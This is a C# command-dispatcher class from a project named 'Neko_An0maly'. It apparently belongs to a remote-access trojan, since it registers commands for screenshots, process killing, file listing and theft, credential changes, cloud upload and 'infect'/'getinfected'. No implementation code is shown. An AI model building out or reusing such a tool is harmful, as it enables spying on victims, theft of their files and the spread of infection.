using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Neko_An0maly.Commands
{
    public class CommandHandler
    {
        List<Command> commands;

        public CommandHandler()
        {
            this.commands = new List<Command>();

            this.commands.Add(new Ping("ping"));
            this.commands.Add(new Exit("exit"));
            this.commands.Add(new Test("test"));
            this.commands.Add(new Help("help"));
            this.commands.Add(new Screenshot("srsht"));
            this.commands.Add(new Open("open"));
            this.commands.Add(new Clear("clear"));
            this.commands.Add(new GetProcList("getproclist"));
            this.commands.Add(new KillProc("killproc"));
            this.commands.Add(new StartProc("startproc"));
            this.commands.Add(new ListDir("listdir"));
            this.commands.Add(new Delete("delete"));
            this.commands.Add(new ChangeCreds("changecreds"));
            this.commands.Add(new Create("create"));
            this.commands.Add(new GetFile("getfile"));
            this.commands.Add(new Infect("infect"));
            this.commands.Add(new SendFile("sendfile"));
            this.commands.Add(new CloudDelete("clouddel"));
            this.commands.Add(new CloudUpload("cloudupld"));
            this.commands.Add(new GetInfected("getinfected"));
            this.commands.Add(new AddInfected("addinfected"));
            this.commands.Add(new GetTree("tree"));
        }

        public string runCommand(string cmd)
        {
            string[] sp = cmd.Split(' ');
            string name = sp.First();
            string[] args = sp.Skip(1).ToArray();

            foreach (Command c in commands)
                if (c.name.ToLower() == name)
                    return c.execute(args);

            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("This command does not exist!");
            Console.ForegroundColor = ConsoleColor.White;
            return "This command does not exist!";
        }
    }
}
